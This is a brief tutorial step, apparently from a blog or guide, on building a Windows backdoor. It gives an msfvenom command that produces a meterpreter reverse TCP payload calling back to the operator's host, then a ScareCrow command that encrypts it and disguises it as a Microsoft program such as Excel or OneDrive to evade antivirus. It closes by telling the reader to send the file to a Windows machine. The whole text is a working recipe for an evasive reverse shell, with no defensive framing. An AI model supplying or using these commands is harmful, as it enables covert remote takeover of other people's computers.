  • 03 Create an executable
# Spawn a Metasploit executable
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=YOUR_IP LPORT=LISTENER_PORT -f raw -o av-bypass.bin

# Make the executable undetectable
./ScareCrow -I av-bypass.bin -domain www.microsoft.com -encryptionmode AES
# This spawns a random exe, like powerpoint, onedrive, etc. I've tried with excel and it worked first try.

Now send the generated executable to a Windows machine, and that's all!
